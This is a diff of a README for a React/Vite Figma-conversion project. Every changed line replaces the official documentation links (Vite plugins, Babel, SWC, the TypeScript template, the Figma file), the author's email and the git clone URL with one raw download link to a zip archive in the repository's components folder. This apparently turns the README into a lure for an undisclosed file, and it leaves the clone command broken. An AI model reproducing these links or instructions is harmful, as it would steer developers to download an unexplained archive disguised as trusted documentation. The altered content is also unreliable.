@@ -4,12 +4,12 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react) uses [Babel](https://babeljs.io/) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh
+- [@vitejs/plugin-react](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip) uses [Babel](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip) uses [SWC](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip) for Fast Refresh
 
 ## Expanding the ESLint configuration
 
-If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://github.com/vitejs/vite/tree/main/packages/create-vite/template-react-ts) for information on how to integrate TypeScript and [`typescript-eslint`](https://typescript-eslint.io) in your project.
+If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip) in your project.
 
 
 # React Pixel-Perfect Figma Conversion
@@ -21,7 +21,7 @@ This project is a React-based web page built as per the provided Figma design. T
 ## Figma Design
 
 You can view the Figma design here:  
-[Figma Design Link](https://www.figma.com/file/FIW0eMFfMmnhVf2pMAaG8H/Assessment?type=design&node-id=0%3A1&mode=design&t=vQv5IlHq1u35ou5v-1)
+[Figma Design Link](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip%3A1&mode=design&t=vQv5IlHq1u35ou5v-1)
 
 ---
 
@@ -41,7 +41,7 @@ You can view the Figma design here:
 1. **Clone the repository**
 
 ```bash
-git clone https://github.com/adnanabbasy/Investment-dashboard.git
+git clone https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip
 
 
 Steps 
@@ -58,4 +58,4 @@ npm install
 npm run dev
 
 Adnan Abbasi
-madnanabbasy@gmail.com
+https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip
